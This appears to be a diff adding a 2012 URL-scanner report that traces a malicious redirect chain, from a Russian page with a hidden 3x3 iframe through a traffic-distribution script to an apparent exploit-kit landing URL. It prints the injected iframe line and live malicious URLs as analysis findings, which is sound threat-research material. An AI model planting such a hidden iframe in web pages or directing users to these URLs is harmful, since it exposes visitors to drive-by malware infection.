@@ -1,0 +1,77 @@
+
++--------------+
+| URL Overview |
++--------------+
+ URL: http://zagprom124.ru/flow6.php
+ IP Address: 91.243.115.135
+ Analyzed on: Fri Dec 28 09:46:26 +0000 2012
+ Status: Report completed
+ Response code: 200
+ Redirect to: 
+
++--------------+
+| URL Settings |
++--------------+
+ User Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13
+ Referer: http://www.google.com/
+
++--------------+
+| Blacklisting |
++--------------+
+ Google Safebrowsing: Yes
+ Norton Safe Web: Untested
+
++---------+
+| Content |
++---------+
+ +----------
+ | Length: 87
+
+<iframe src="http://clientlink054.ru/tds/in.cgi?default" height="3" width="3"></iframe>
+
++--------+
+| Iframe |
++--------+
+ - http://clientlink054.ru/tds/in.cgi?default
+
++------------------------------------------------------------------------------+
+
++--------------+
+| URL Overview |
++--------------+
+ URL: http://clientlink054.ru/tds/in.cgi?default
+ IP Address: 91.243.115.135
+ Analyzed on: Fri Dec 28 09:46:28 +0000 2012
+ Status: Report completed
+ Response code: 302
+ Redirect to: http://on.snorts.co.uk/on/jewwlane.php?cuteptly=335827
+
++--------------+
+| URL Settings |
++--------------+
+ User Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13
+ Referer: http://zagprom124.ru/flow6.php
+
++--------------+
+| Blacklisting |
++--------------+
+ Google Safebrowsing: No
+ Norton Safe Web: Untested
+
++---------+
+| Content |
++---------+
+ +----------
+ | Length: 241
+
+<html><head><meta http-equiv="REFRESH" content="1; URL='http://on.snorts.co.uk/on/jewwlane.php?cuteptly=335827'"></head>
+<body>
+<h1>Document moved <a href="http://on.snorts.co.uk/on/jewwlane.php?cuteptly=335827">here</a></h1>
+</body>
+</html>
+
++-------+
+| Links |
++-------+
+ - http://on.snorts.co.uk/on/jewwlane.php?cuteptly=335827
+
